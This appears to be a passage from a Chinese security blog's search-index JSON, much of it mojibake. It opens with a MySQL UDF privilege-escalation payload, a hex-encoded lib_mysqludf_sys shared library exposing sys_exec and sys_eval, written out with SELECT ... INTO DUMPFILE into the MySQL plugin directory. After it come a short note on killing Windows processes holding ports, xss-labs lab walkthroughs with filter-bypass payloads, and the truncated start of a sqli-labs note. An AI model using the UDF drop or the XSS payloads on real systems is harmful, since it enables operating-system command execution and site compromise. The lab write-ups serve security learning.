000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000 INTO DUMPFILE /usr/lib/mysql/plugin/udf.so; lib_mysqludf_sys_64.so SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE /usr/lib/mysql/plugin/udf.so;","tags":["MySQL","ææƒ","UDF"],"categories":["MySQL","ææƒ"]},{"title":"è§£å†³Windowsç«¯å£å ç”¨é—®é¢˜","path":"/2025/07/29/è§£å†³Windowsç«¯å£å ç”¨é—®é¢˜/","content":"è§£å†³Windowsç«¯å£å ç”¨é—®é¢˜ æˆ‘åœ¨æ­å»ºé¶åœºæ—¶å‘ç°æ€»æœ‰äº›ç«¯å£è¢«å ç”¨ï¼Œä½œä¸ºä¸€åè®¡ç®—æœºå°ç™½ï¼Œè¿™è®©æˆ‘è‹¦æ¼ä¸‡åˆ†ï¼Œäºæ˜¯æˆ‘ä¸Šç½‘æŸ¥æ‰¾è§£å†³æ–¹æ³•ï¼Œä¸‹é¢çš„æ–¹æ³•æ˜¯äº²æµ‹æœ‰æ•ˆçš„ ä»¥è§£å†³8700ç«¯å£ä¸ºä¾‹ï¼š ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹8700ç«¯å£è¢«å“ªä¸ªè¿›ç¨‹å ç”¨ netstat -ano | findstr 8700 æˆ‘ä»¬çœ‹åˆ°28076è¿™ä¸ªè¿›ç¨‹è¢«ç›‘å¬äº†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹çº¿ç¨‹å…·ä½“ä»»åŠ¡ tasklist | findstr 28076 æˆ‘ä»¬çœ‹åˆ°æ˜¯è¢«httpdç¨‹åºå ç”¨ï¼Œå¯ä»¥ç›´æ¥å»ä»»åŠ¡ç®¡ç†å™¨å¼ºåˆ¶å…³é—­ï¼Œä½†æ˜¯æˆ‘ä»¬é€šå¸¸è·³è¿‡è¿™ä¸€æ­¥ç›´æ¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ taskkill /pid 28076 /f å› æ­¤å…³é—­ç«¯å£å®é™…ä¸Šåªéœ€è¦2æ­¥ï¼šæŸ¥æ‰¾ç«¯å£å¯¹åº”çš„pidâ€”â€”æ€æ­»è¯¥pid","tags":["Windows"],"categories":["Windows"]},{"title":"xss-labs","path":"/2025/07/28/xss-labs/","content":"xss-labs level2 å…ˆç”¨åŸºç¡€payloadï¼š scriptalert(1)/script æŸ¥çœ‹ç½‘é¡µæºç ï¼š è¯´æ˜æœåŠ¡ç«¯å¯¹ç”¨æˆ·è¾“å…¥åšäº†è½¬ä¹‰ï¼ˆ å˜æˆäº† ltï¼‰ æŸ¥çœ‹é¢˜ç›®æºä»£ç ï¼š å‘ç° htmlspecialchars($str) èƒ½å°†ä¸€äº›ç‰¹æ®Šçš„ HTML å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ å­—ç¬¦ è½¬æ¢ä¸º amp; lt; gt; quot; ' #039; ï¼ˆå½“ ENT_QUOTES è¢«è®¾ç½®æ—¶ï¼‰ nbsp; æˆ‘ä»¬å¯ä»¥ç›´æ¥é—­åˆinputæ ‡ç­¾è¿›è¡Œç»•è¿‡ scriptalert(1)/script level3 è¿˜æ˜¯å…ˆç”¨ï¼š scriptalert(1)/script æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼š å‘ç°è¡¨å•å†…çš„å’Œh2æ ‡ç­¾çš„éƒ½è¢«è½¬ä¹‰äº† æŸ¥çœ‹æºä»£ç ï¼š echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform action=level3.php method=GETinput name=keyword value=.htmlspecialchars($str). input type=submit name=submit value=æœç´¢ / å•å¼•å·è™½ç„¶å­˜åœ¨å®ä½“aposä½†æ˜¯ä¸è¢«è½¬ä¹‰ï¼ˆæœªè®¾ç½®ENT_QUOTESï¼‰ï¼ŒHTML5ä¸­é¢„ç•™ä½†æ˜¯ä¹Ÿä¸æ¨èä½¿ç”¨ å…ˆé—­åˆvalueï¼Œå†å¼•å…¥é¼ æ ‡äº‹ä»¶çš„å±æ€§(æœ€å¸¸ä¸ inputã€select å’Œ a æ ‡ç­¾ä¸€èµ·ä½¿ç”¨)ï¼š onclick onfocus onmouseover onmouseout å†é—­åˆjavascriptä¼ªåè®®æ¥æ‰§è¡Œ onclick=javascript:alert(1) //ç‚¹å‡»inputæ ‡ç­¾æ—¶ onfocus=javascript:alert(1) //èšç„¦inputæ ‡ç­¾æ—¶ onmouseover=javascript:alert(1) //è¿›å…¥inputæ ‡ç­¾æ—¶ onmouseout=javascript:alert(1) //ç§»å‡ºinputæ ‡ç­¾æ—¶ æ€»ç»“ï¼šonfocuså¯ä»¥ç»•è¿‡htmlå®ä½“åŒ–(å³å·çš„è¿‡æ»¤) level5 ä¾æ—§scriptalert(1)/scriptå¼€å±€ï¼Œscriptå˜æˆscr_iptï¼Œå†è¯•è¯•é¼ æ ‡äº‹ä»¶ï¼Œonå˜æˆo_n æºä»£ç ï¼š è¿‡æ»¤äº†jsçš„æ ‡ç­¾è¿˜æœ‰onfocusäº‹ä»¶ï¼Œè™½ç„¶str_replaceä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯æœ‰å°å†™å­—æ¯è½¬åŒ–å‡½æ•°ï¼Œæ‰€ä»¥å°±ä¸èƒ½ç”¨å¤§å°å†™æ³•æ¥ç»•è¿‡è¿‡æ»¤äº†ï¼Œåªèƒ½æ–°æ‰¾ä¸€ä¸ªæ–¹æ³•è¿›è¡Œxssæ³¨å…¥ è¿™é‡Œå¯ä»¥ä½¿ç”¨aæ ‡ç­¾çš„hrefå±æ€§ payloadï¼š a href=javascript:alert(1)1/a ç‚¹å‡»é“¾æ¥å°±å¯ä»¥äº† level6 è¿™é¢˜æ›¿æ¢çš„å…³é”®å­—æ¯”ä¸Šé¢˜å¤šï¼Œä½†æ˜¯æ²¡æœ‰æ·»åŠ å°å†™è½¬åŒ–å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨å¤§å°å†™ç»•è¿‡ level7 ä¸éš¾å‘ç°ï¼Œè¿™é‡Œé¢è¿›è¡Œäº†å°å†™è½¬åŒ–ï¼Œå°†æ£€æµ‹å‡ºæ¥çš„onï¼Œscriptï¼Œhrefï¼Œsrcå’Œdataç»™åˆ æ‰äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŒå†™æ¥ç»•è¿‡ æ¯”å¦‚ä¸‹é¢è¿™ä¸ªpayloadï¼š scriscriptptalert(1)/scriscriptpt level8 æ˜¯æŠŠä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œè½¬å°å†™ä¹‹åè¿›è¡Œä¸€ç³»åˆ—è¿‡æ»¤æ“ä½œï¼Œæœ€åå°†å­—ç¬¦å†™å…¥aæ ‡ç­¾çš„hrefå±æ€§ä¸­ï¼Œè·³è½¬é“¾æ¥ æˆ‘ä»¬èƒ½åˆ©ç”¨hrefçš„éšè—å±æ€§è‡ªåŠ¨Unicodeè§£ç ï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥ä¸€æ®µjsä¼ªåè®® javascript:alert() åˆ©ç”¨åœ¨çº¿å·¥å…·è¿›è¡ŒUnicodeç¼–ç åå¾—åˆ° #106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#41; æ€»ç»“ï¼š hrefå±æ€§è‡ªåŠ¨è§£æUnicodeç¼–ç  level9 ä¸‹é¢å¤šäº†ä¸ªstrpos()å‡½æ•°çš„éªŒè¯ï¼Œè¾“å…¥å­—ç¬¦ä¸²å¿…é¡»åŒ…å«http:// payload1ï¼š å°†http://ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰å¦åˆ™ä¼šæ‰§è¡Œä¸äº†æ— æ³•å¼¹çª— #106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#41;/* http:// */ payload2ï¼š å°†http://å†™åœ¨alertå†… #106;#97;#118;#97;#115;#99;#114;#105;#112;#116;:alert(http://) æ€»ç»“ï¼šæ’å…¥æŒ‡å®šå†…å®¹ï¼ˆæœ¬å…³æ˜¯http://ï¼‰ç»•è¿‡æ£€æµ‹ level10 è¿™é‡Œæœ‰éšè—çš„ä¼ å‚æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰åç«¯ä»£ç ï¼Œå°±æŸ¥çœ‹é¡µé¢æºä»£ç ä¸€ä¸ªä¸€ä¸ªæµ‹ï¼Œè¿™é‡Œæ˜¯getä¼ å‚t_sortï¼Œå¹¶è¿‡æ»¤æ‰äº†å·ï¼Œä¸èƒ½é—­åˆæ’å…¥æ ‡ç­¾ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜èƒ½ç”¨onfocusäº‹ä»¶ï¼Œå› ä¸ºè¿™é‡Œè¾“å…¥æ¡†è¢«éšè—äº†ï¼Œéœ€è¦æ·»åŠ type=textï¼Œæ„é€ payloadï¼š ?t_sort= onfocus=javascript:alert() type=text è¿™é‡Œinputæ ‡ç­¾å†…å°†ä¼šå‡ºç°ä¸¤ä¸ªtypeå±æ€§ï¼Œæµè§ˆå™¨é€šå¸¸ä¼šåˆ¤å®šç¬¬ä¸€ä¸ªå‡ºç°çš„å€¼ä½œä¸ºæœ€ç»ˆçš„å€¼ level11 å…ˆçœ‹å‚æ•°t_sortï¼Œæƒ³é€šè¿‡è¦†ç›–typeå±æ€§çš„å€¼å°±è¦é—­åˆåŒå¼•å·ï¼Œå°±ä¼šè¢«è½¬ä¹‰ï¼Œæ˜¯è¡Œä¸é€šçš„ï¼Œé‚£å°±é€šè¿‡t_refå‚æ•°ï¼Œä¿®æ”¹refå¤´æ¥è¿›è¡Œxss level15 å…¶ä¸­ï¼š span class=ng-include:.htmlspecialchars($str). ng-includeç±»ä¼¼äºphpçš„æ–‡ä»¶åŒ…å« ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTMLæ–‡ä»¶ï¼ŒåŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ï¼Œng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„å‡ ç‚¹å¦‚ä¸‹ï¼š ng-include,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å· ng-include,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ ng-include,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ« ng-inclue,è®°è½½å¤–éƒ¨htmlä¸­çš„linkæ ‡ç­¾å¯ä»¥åŠ è½½ æˆ‘ä»¬å…ˆè¯•è¯•çœ‹åŒ…æ¶µç¬¬ä¸€å…³ï¼Œæ„å»ºpayloadï¼š ?src=/level1.php æ³¨æ„ï¼Œè¿™é‡Œä¸èƒ½åŒ…æ¶µé‚£äº›ç›´æ¥å¼¹çª—çš„ä¸œè¥¿å¦‚scriptï¼Œä½†æ˜¯å¯ä»¥åŒ…æ¶µé‚£äº›æ ‡ç­¾çš„ä¸œè¥¿æ¯”å¦‚aã€inputã€imgã€pæ ‡ç­¾ç­‰ç­‰ï¼Œè¿™äº›æ ‡ç­¾æ˜¯èƒ½éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ç‚¹å‡»å¼¹çª—çš„ ?src=level1.php?name=a href=javascript:alert(1)xss/a//é”™è¯¯çš„ï¼Œè‡ªå·±çœ‹ç€ç‚¹å•åŒå¼•å·?src=level1.php?name=a href=javascript:alert(/xss/)//æ­£ç¡®çš„?src=level1.php?name=img src=1 onerror=alert(1)///é”™è¯¯çš„ï¼Œä¸è¦åŠ /?src=level1.php?name=img src=1 onerror=alert(1)//æ­£ç¡®çš„ æ€»ç»“ï¼šng-includeæ–‡ä»¶åŒ…æ¶µï¼Œå¯ä»¥æ— è§†htmlå®ä½“åŒ– level16 å°†scriptã€ ã€/è½¬åŒ–ä¸ºç©ºæ ¼çš„htmlå®ä½“åŒ–å½¢å¼ï¼Œå¯ä»¥ç”¨å›è½¦çš„URLç¼–ç %0aä»£æ›¿ç©ºæ ¼ç»•è¿‡ï¼Œå†é…åˆä¸Šä¸ç”¨/çš„imgã€svgç­‰æ ‡ç­¾ payloadï¼š ?keyword=img%0asrc=1%0aonerror=alert(1) å‚è€ƒï¼š XSS-potatowo xss-labsé¶åœºå®æˆ˜å…¨é€šå…³è¯¦ç»†è¿‡ç¨‹ï¼ˆxssé¶åœºè¯¦è§£ï¼‰","tags":["æ¼æ´","CTF","XSS","é¶åœº"],"categories":["CTF","é¶åœº"]},{"title":"sqli-labs","path":"/2025/07/28/sqli-labs/","content":"sqli-labs Less-17 åŸºäºæŠ¥é”™æ³¨å…¥çš„åŠ å¼ºç‰ˆ æµ‹è¯•æ³¨å…¥ç‚¹æ—¶å‘ç°æ— è®ºå¦‚ä½•éƒ½æ²¡ååº”ï¼Œåªå‡ºç°ä¸Šå›¾æƒ…å†µï¼Œå½“ç”¨æˆ·åä¸ºâ€˜ admin â€™æˆ–â€˜ Dumb â€™æ—¶ä»»æ„å¯†ç ç™»å½• å‘ç°å¯†ç ä¼šè¢«æ›´æ–° 